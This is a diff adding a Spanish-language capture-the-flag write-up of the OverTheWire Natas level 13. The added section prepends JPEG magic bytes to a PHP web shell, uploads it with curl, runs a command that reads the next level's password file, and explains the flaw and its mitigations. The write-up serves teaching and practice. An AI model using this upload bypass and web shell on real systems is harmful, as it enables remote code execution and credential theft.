@@ -1,5 +1,5 @@
 ---
-type: post
+type: writeup
 title: Over The Wire - Natas
 description: Resolución de todos los niveles de Natas en Over The Wire
 lang: es
@@ -1425,3 +1425,73 @@ Choose a JPEG to upload (max 1KB):<br/>
 </body>
 </html>
 ```
+
+```bash
+printf '\xFF\xD8\xFF\xE0' | dd of=shell.php bs=1 count=4 conv=notrunc
+```
+
+```plaintext
+4+0 records in
+4+0 records out
+4 bytes copied, 6.2643e-05 s, 63.9 kB/s
+```
+
+```bash
+xxd shell.php 
+```
+
+```plaintext
+00000000: ffd8 ffe0 3c3f 7068 7020 7379 7374 656d  ....<?php system
+00000010: 2824 5f47 4554 5b22 636d 6422 5d29 3b20  ($_GET["cmd"]); 
+00000020: 3f3e 0a                                  ?>.
+```
+
+```bash
+curl -F "MAX_FILE_SIZE=1000" -F "filename=shell.php" -F "uploadedfile=@shell.php;type=image/jpeg" --user natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k http://natas13.natas.labs.overthewire.org/
+```
+
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas13", "pass": "g8ba0olAzaSJuyS4gnmbdVVigAICLG1k" };</script></head>
+<body>
+<h1>natas13</h1>
+<div id="content">
+For security reasons, we now only accept image files!<br/><br/>
+
+The file <a href="upload/362mgbg49g.php">upload/362mgbg49g.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+```bash
+curl -s -G --user natas13:g8ba0olAzaSJuyS4gnmbdVVigAICLG1k --data-urlencode "cmd=cat /etc/natas_webpass/natas14" http://natas13.natas.labs.overthewire.org/upload/362mgbg49g.php
+```
+
+```plaintext
+����A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+```
+
+<Callout type="success" title="Password natas14">
+A0xXu2x9FW8rb8OSQ4ei6n5VBbLUz8h8
+</Callout>
+
+<Callout type="warning" title="Vulnerabilidad">
+Unrestricted File Upload que deriva en Remote Code Execution (RCE), combinado con un Bypass of File Type Validation using Magic Bytes. El desarrollador intentó mejorar la seguridad validando el tipo de archivo mediante su contenido real en lugar de confiar solo en la extensión. Sin embargo, la validación implementada es débil porque solo comprueba los primeros bytes del archivo (las firmas o Magic Bytes que identifican a un JPEG) para determinar si es una imagen válida. Al anteponer estos bytes a una estructura de código PHP válida, la aplicación aprueba la subida y el servidor web ejecuta el código malicioso cuando se solicita el archivo `.php`.
+- [**CWE-434** Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
+- [**CWE-20** Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
+</Callout>
+
+<Callout type="tip" title="Mitigación">
+- Funciones como `exif_imagetype()` o la revisión de cabeceras son fáciles de evadir. Se deben complementar con un procesamiento real del archivo (por ejemplo, intentar re-renderizar o recrear la imagen usando la librería GD de PHP con `imagecreatefromjpeg()`, lo cual destruye cualquier código PHP embebido).
+- El backend debe generar e imponer su propia extensión permitida (como `.jpg`) basándose estrictamente en el tipo de archivo validado, descartando por completo extensiones peligrosas suministradas por el usuario (como `.php`).
+- Bloquear la interpretación de código de scripts en el directorio de subidas (por ejemplo, con php_flag engine off en Apache o bloqueando la ejecución en Nginx) para asegurar que el archivo se sirva estrictamente como un recurso estático (descarga o visualización de imagen), sin importar su extensión.
+</Callout>
